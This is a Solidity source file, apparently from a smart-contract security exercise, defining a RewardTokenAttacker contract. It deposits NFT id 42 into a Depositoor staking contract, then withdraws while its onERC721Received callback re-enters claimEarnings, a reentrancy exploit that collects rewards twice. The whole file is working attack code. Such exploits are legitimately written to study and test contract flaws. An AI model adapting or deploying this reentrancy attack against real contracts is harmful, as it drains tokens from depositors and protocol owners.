//SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {Depositoor} from "./RewardToken.sol";

contract RewardTokenAttacker {
    address public rewardToken;
    address public nft;
    address public depositoor;

    function deposit(address rewardToken_, address nft_, address depositoor_) external {
        rewardToken = rewardToken_;
        nft = nft_;
        depositoor = depositoor_;

        IERC721(nft).safeTransferFrom(address(this), depositoor, 42);
    }

    function attack() external {
        Depositoor(depositoor).withdrawAndClaimEarnings(42);
    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata)
        external
        returns (bytes4)
    {
        Depositoor(depositoor).claimEarnings(42);

        return IERC721Receiver.onERC721Received.selector;
    }
}
